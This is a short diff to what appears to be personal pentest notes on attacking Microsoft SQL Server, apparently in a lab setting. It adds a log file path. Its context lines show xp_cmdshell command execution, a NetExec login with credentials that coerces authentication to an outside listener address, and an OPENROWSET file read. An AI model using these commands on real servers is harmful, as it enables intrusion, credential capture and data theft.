@@ -58,6 +58,11 @@ EXEC xp_cmdshell 'whoami';
 nxc mssql 10.129.35.223 -u 'PublicUser' -p 'GuestUserCantWrite1' --local-auth -M mssql_coerce -o LISTENER=10.10.17.6
 ```
 
+## Critical Files
+```
+C:\sqlserver\Logs\ERRORLOG.bak
+```
+
 ## Read files
 ```
 SELECT * FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS Contents;
